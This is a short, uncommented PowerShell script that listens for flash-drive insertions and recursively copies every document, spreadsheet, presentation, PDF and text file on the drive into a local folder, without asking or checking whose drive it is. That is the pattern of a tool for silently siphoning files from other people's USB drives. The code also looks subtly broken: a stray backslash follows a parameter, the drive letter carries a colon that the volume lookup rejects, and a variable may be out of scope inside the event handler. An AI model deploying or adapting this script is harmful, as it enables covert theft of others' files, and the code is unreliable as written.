
$documentsPath = [Environment]::GetFolderPath("MyDocuments")

$destinationPath = Join-Path -Path $documentsPath -ChildPath "Copy"

if (-not (Test-Path -Path $destinationPath)) {
    New-Item -Path $destinationPath -ItemType Directory
}

$driveEvent = Register-WmiEvent -Class Win32_VolumeChangeEvent -Action {
    $eventType = $event.SourceEventArgs.NewEvent.EventType

    if ($eventType -eq 2) {
        $driveLetter = $event.SourceEventArgs.NewEvent.DriveName
        $drivePath = $driveLetter + '\'

        $driveType = (Get-Volume -DriveLetter $driveLetter).DriveType
        if ($driveType -eq 'Removable') {
            Write-Host "Flash drive detected: $drivePath"
  
            $docFiles = Get-ChildItem -Path $drivePath -Include *.doc, *.pdf, *.docx, *.xlsx, *.txt, *.ppt, *.pptx -Recurse

            foreach ($file in $docFiles) {
                Write-Host "Copying..."
                $fileName = $file.Name
                $newFilePath = Join-Path -Path $destinationPath -ChildPath $fileName
                Copy-Item -Path $file.FullName -Destination $newFilePath -Force\
                Write-Host "Done..."
            }
        }
    }
}

Write-Host "Listening for flash drive connections..."
do {
    Wait-Event -Timeout 1
} while ($true)
